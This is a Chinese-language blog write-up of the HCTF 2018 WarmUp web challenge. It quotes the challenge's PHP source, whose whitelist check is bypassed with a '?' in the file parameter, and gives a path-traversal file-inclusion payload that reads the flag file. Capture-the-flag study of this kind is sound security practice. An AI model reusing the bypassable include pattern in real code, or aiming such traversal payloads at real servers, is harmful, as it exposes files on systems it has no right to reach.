---
title: HCTF_2018_WarmUp
feature: false
cover: https://ww1.sinaimg.cn/large/005ZbjyVly1gqoniqzhiaj30xc0hg0ub.jpg
tags:
  - BUUCTF
  - Web
  - Source
categories:
  - CTF
keywords: 'Web, Source'
description: HCTF 2018 WarmUp 一道简单的代码审计，审计完之后是一个文件包含的处理
date: 2021-05-16 18:02:01
---
<meta name="referrer" content="no-referrer"/>

# [HCTF 2018] WarmUp

## 题目页面

![005ZbjyVly1gqkfg6zog3j30tq0xugqn](https://ww1.sinaimg.cn/large/005ZbjyVly1gqkfg6zog3j30tq0xugqn.jpg)

没有题目介绍，直接进入下一步

## 访问页面

![005ZbjyVly1gqkfhjzf0yj31aa10q17n](https://ww1.sinaimg.cn/large/005ZbjyVly1gqkfhjzf0yj31aa10q17n.jpg)

页面上只有一个滑稽（斜眼笑）表情，那就想看看源代码

![005ZbjyVly1gqkfj0isobj30tg0bqjto](https://ww1.sinaimg.cn/large/005ZbjyVly1gqkfj0isobj30tg0bqjto.jpg)

获得关键信息`source.php`

继续访问

![005ZbjyVly1gqkfjwxloaj330o1q01kx](https://ww1.sinaimg.cn/large/005ZbjyVly1gqkfjwxloaj330o1q01kx.jpg)

不出意外，页面内容为页面的源代码

## 分析源代码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

```

![005ZbjyVly1gqkfpxw8ibj315w1m6h50](https://ww1.sinaimg.cn/large/005ZbjyVly1gqkfpxw8ibj315w1m6h50.jpg)

:::tip 提示
源代码中提及了一个`hint.php`的文件，访问之后便能知道 flag 文件的名称。
:::

## Payload

最终的 payload 为：
`/index.php?file=hint.php?/../../../../../ffffllllaaaagggg`

具体的返回层数需要不断尝试。

## 成功后的页面

![005ZbjyVly1gqkgurhtz8j330o1q0h1g](https://ww1.sinaimg.cn/large/005ZbjyVly1gqkgurhtz8j330o1q0h1g.jpg)